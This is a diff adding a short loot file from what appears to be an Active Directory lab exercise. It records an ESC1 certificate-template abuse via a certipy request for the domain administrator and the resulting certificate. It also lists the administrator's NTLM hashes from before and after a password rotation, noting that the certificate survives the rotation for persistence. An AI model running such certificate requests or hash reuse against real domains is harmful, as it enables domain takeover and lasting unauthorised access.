@@ -1,0 +1,14 @@
+# Loot Lab-03 DARK GATE — Certificate-based authentication
+# Certificado: administrador.pfx (válido 1 año desde 16/05/2026)
+# Obtenido via: certipy req -upn Administrador@atackcorp.local (ESC1)
+
+[*] Got hash for 'administrador@atackcorp.local' (pre-rotacion):
+aad3b435b51404eeaad3b435b51404ee:b73fdfe10e87b4ca5c0d957f81de6863
+
+[*] Got hash for 'administrador@atackcorp.local' (post-rotacion):
+aad3b435b51404eeaad3b435b51404ee:bc3abc2e0673a58e9e559d415b56d69d
+
+# Crown Jewels
+# Certificado administrador.pfx válido post-rotación de contraseña ✅
+# Hash pre-rotación  : b73fdfe10e87b4ca5c0d957f81de6863
+# Hash post-rotación : bc3abc2e0673a58e9e559d415b56d69d
